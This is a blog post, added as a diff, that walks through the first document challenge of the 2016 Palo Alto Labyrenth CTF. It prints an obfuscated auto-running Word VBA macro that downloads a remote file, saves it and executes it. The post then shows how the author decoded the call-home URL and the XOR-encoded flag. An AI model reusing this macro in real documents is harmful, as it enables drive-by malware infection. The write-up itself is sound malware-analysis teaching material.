@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="application-name" content="Blog">
+    <meta name="dedication" content="קדש ליהוה">
+    <title>
+    
+    
+    
+    </title>
+    
+    <link rel="stylesheet" href="https://blog.heiseink.com/main.min.634dc65af451821d063d79318c077f783973353bc7fd10fa9b29eaf1cdd4fb5a.css">
+</head>
+
+<body>
+    <nav class="navbar" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="/"><img src="/images/logo.png" width="128" height="32"></a>
+            <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+            </a>
+        </div>
+        <div class="navbar-menu">
+            <div class="navbar-start">
+                
+                
+                    <a class="navbar-item active" href="/posts/" title="">Random Thoughts</a>
+                
+                    <a class="navbar-item" href="/projects/" title="">Projects</a>
+                
+                    <a class="navbar-item" href="/about/" title="">WhoAmI</a>
+                
+            </div>
+            <div class="navbar-end">
+            </div>
+        </div>
+    </nav>
+    
+<section class="section">
+  <div class="container">
+    <h1 class="title">2016 Palo Alto Labyrenth CTF - Doc 01</h1>
+    <div class="level">
+      <div class="level-left">
+        
+          
+          <div class="level-item"><span class="tag"><a href="/tags/security/">security</a></span></div>
+          
+          <div class="level-item"><span class="tag"><a href="/tags/CTF/">CTF</a></span></div>
+          
+          <div class="level-item"><span class="tag"><a href="/tags/maldoc/">maldoc</a></span></div>
+          
+          <div class="level-item"><span class="tag"><a href="/tags/Labyrenth/">Labyrenth</a></span></div>
+                      
+        
+      </div>
+      <div class="level-right">
+        <div class="level-item has-text-centered">
+          <div>
+            <p class="heading">Article Date</p>
+            <p>2016 Aug 15</p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-content">
+        <div class="content">
+          <p>On 2016-07-15 at 5pm EST <a href="https://www.paloaltonetworks.com/">Palo Alto Networks</a> started a <a href="https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security">Capture the Flag</a> competition with cash prizes called <a href="http://www.labyrenth.com/">PAN Labyrenth CTF</a>. When I looked at the challenges I noticed that there was a Documents track, and since there was a cash prize to the frist person to complete a given track I thought I&rsquo;d give it a go..hey $1000 for a few hours is not bad. It only took me a few hours (actually more than I intended because I got stuck overthinking one of the problems), but I don&rsquo;t think I was the first one to complete the track. Regardless, I thought I&rsquo;d share the steps I went through to solve each of the challenges.</p>
+<ul>
+<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a> &lt;- You are here</li>
+<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a></li>
+<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
+<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
+<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a></li>
+</ul>
+<p>So to get starting running the CTF you need the initial code for the DOCs track which is found on the getting started page&hellip;it was <em>PAN{DOCS_START}</em>. Upon entering this you are given a zip file to download (hash: <a href="/data/PAN_CTF_DOCTrack_001.zip">846CBD76B491FD6F74212A4259FE933A0FEBF3E5EA93D24A91241EDCD98D5EDC</a>). This file contains two items, one the first document named challenge.doc (hash:9BBEDADF4A5A9CC75DDA5F4CCE7416BEDD1B2221BF80BF6C3CC73DFEE9A337CD), and the second is a file simply named &ldquo;.7z&rdquo; (hash:B588AAC998556D1F853AD8C3D4D428CEB26B7D38CFD073CC77C82F4C6EF4FA97). We&rsquo;ll come back to this file in a little bit (as it is a shortcut), but let start with the other file &ldquo;&rdquo;.</p>
+<p>So what do you do first? Open the file in word? Are you a n00b or insane? probably a little of both&hellip;if you&rsquo;re going to go this route, please make sure that you&rsquo;re doing it on a machine you can easily clean and have some sort of network monitoring turned on&hellip;.or a sandbox of somesort.</p>
+<p>So you can just open it if you trust the document or know what you&rsquo;re doing&hellip;but don&rsquo;t trust it, are you even sure its actually a document? You need a tool to determine as much as you can without running it&hellip;this is static analysis. Personal I lean on tools that I&rsquo;ve written, but there are lots of great tools out there and I&rsquo;m not trying to steer you away or towards any particular tool&hellip;I&rsquo;m just showing you what I did.</p>
+<p>So we run it through my <a href="https://github.com/DBHeise/fileid">FileId</a> tool and get the VBA code out (using the XML or JSON output options). You could also use many other tools, for example: <a href="http://www.decalage.info/python/oletools">OleTools</a> by Philippe Lagadec, or <a href="https://blog.didierstevens.com/programs/oledump-py/">OleDump</a> by Didier Stevens. In the end you get this code:</p>
+<pre><code>Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer)
+	Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA
+	vSHOfSrEta = ActiveDocument.Variables(&quot;ppKzr&quot;).Value()
+	gsFEVmmIzO = &quot;&quot;
+	dHLdiEqdts = 1
+	While dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2
+		eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta)
+		gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1)))
+		dHLdiEqdts = dHLdiEqdts + 1
+	Wend
+	QklkhFEQNB = gsFEVmmIzO
+End Function
+
+Public Function BkAIuNwQNDkohBY()
+	twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _
+	78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _
+	12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _
+	9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _
+	2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _
+	30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _
+	62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _
+	1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)
+	UkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188)
+	Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))
+	Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))
+	xHttp.Open UkIWIEtqCF, twOvwCSTPL, False
+	xHttp.Send
+	With bStrm
+		.Type = 1
+		.Open
+		.write xHttp.responseBody
+		.savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2
+	End With
+	Shell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))
+End Function
+
+Private Sub Document_Open()
+	If ActiveDocument.Variables(&quot;ppKzr&quot;).Value &lt;&gt; &quot;toto&quot; Then
+		BkAIuNwQNDkohBY
+		ActiveDocument.Variables(&quot;ppKzr&quot;).Value = &quot;toto&quot;
+		If ActiveDocument.ReadOnly = False Then
+			ActiveDocument.Save
+		End If
+	End If
+End Sub
+</code></pre><p>Looking at this code I can see a couple of things that stand out:</p>
+<ol>
+<li>the QklkhFEQNB function is the string deobfuscation function. You can tell this by its frequency of use and its always called before the string is needed (look for CreateObject)</li>
+<li>it does have an autorun functionality (i.e. &ldquo;Document_Open&rdquo;), so if we had opened the file and ran the macros it would have done its business</li>
+</ol>
+<p>What is its business, well without too much digging we can see that it has a variable named xHttp and xStrm in the BkAIuNwQNDkohBY function and we can see that there is a Shell command. Often variable names are also obfuscated in malicious documents so the fact that they aren&rsquo;t kind of stands out. So it downloads something, saves it to disk, and executes it.</p>
+<p>So first things first we want to see to where it calls home. To accomplish this we have the deobfuscation function in VBA, so lets open M$Word, create a new document, open up the VBA Editor and drop it in.</p>
+<p>If you do this you will see that it won&rsquo;t quite work that simply. If you look carefully at the deobfuscation function you&rsquo;ll notice it references a document variable:</p>
+<pre><code>ActiveDocument.Variables(&quot;ppKzr&quot;).Value()
+</code></pre><p>and in the Document_Open subroutine it references this same variable and sets it to &ldquo;toto&rdquo;. Knee-jerk reaction replace that with the static string &ldquo;toto&rdquo;&hellip;.nope won&rsquo;t work, remember the way the code is written it must NOT be &ldquo;toto&rdquo; at first. So we have a couple of options at this point:</p>
+<ol>
+<li>We can brute force the value for the &ldquo;ppKzr&rdquo; variable</li>
+<li>We can try to look up the value</li>
+<li>We can just run it though a sandbox, or something monitoring the network traffic involved</li>
+</ol>
+<p>At this point I honestly went with option #3 (but we&rsquo;ll come back to the other two options in other documents in this CTF track)&hellip;it was easy and quick.</p>
+<p>In the end we have this URL that it tries to call home to (defanged):</p>
+<pre><code>hXXp://{REDACTED RFC1918 IPv4}/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.executes
+</code></pre><p>well that IP doesn&rsquo;t help us, its a <a href="https://www.rfc-editor.org/rfc/rfc1918.txt">RFC1918</a> (or via <a href="https://en.wikipedia.org/wiki/Private_network">Wikipedia</a>) private block&hellip;but hmmm, that blob in the middle looks base64 encoded&hellip;and it even says &ldquo;b64&rdquo; but it also has a 0x58 before the blob&hellip;we&rsquo;ll come back to that. So you run the &ldquo;MDgx&hellip;jU=&rdquo; string through your base64 decoder of choice (I used powershell):</p>
+<pre><code>$s1 = &quot;MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=&quot;
+[Convert]::FromBase64String($s1)
+</code></pre><p>You run the above and you&rsquo;ll get an error immediate error:</p>
+<pre><code>Exception calling &quot;FromBase64String&quot; with &quot;1&quot; argument(s): &quot;The input is not a valid Base-64 string as it contains a non-base 64
+character, more than two padding characters, or an illegal character among the padding characters. &quot;
+</code></pre><p>Not a valid base64 string?? hmmm&hellip;lets look at that string again&hellip;wait there&rsquo;s a &ldquo;\n&rdquo; in that string&hellip;.ok so we can either take it out or make sure powershell properly escapes it&hellip;just change &ldquo;\n&rdquo; to &ldquo;`n&rdquo; as this is how powershell escapes stuff. So we run it through the base64 decoding function again and it works&hellip;but its just a bunch of bytes&hellip;but wait there all in a small range. Taking a guess that its an ASCII string I&rsquo;ll run this powershell command:</p>
+<pre><code>[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s1))
+</code></pre><p>boom and I get a string (shortened for brevity):</p>
+<pre><code>081916230e3102313a696b07683634216...68071336682f072f306b2a6b6a3468683325
+</code></pre><p>well that isn&rsquo;t very interesting, but I think I&rsquo;m stil on the right track. Now I need to go back to the 0x58&hellip;hmmm&hellip;I wonder if this an XOR string and perhaps the 0x58 is the key. How would I check this? I&rsquo;ll turn to another tool <a href="http://www.kahusecurity.com/tools/">DataConverter</a> by Kahu Security (of course there are other tools&hellip;)</p>
+<p>So I put our string in and mark it as Hex format (looks hex to me), and enter our hex key 0x58 and we get (key is REDACTED for you pleasure):</p>
+<pre><code>PAN{_REDACTED_}
+</code></pre><p>huh&hellip;PAN{<em>blahblahblah</em>} that looks like the key we entered to get this started&hellip;lets try it out&hellip;</p>
+<p>POOF</p>
+<p>&hellip;it works and we get doc02</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+    
+    
+</body>
+</html>
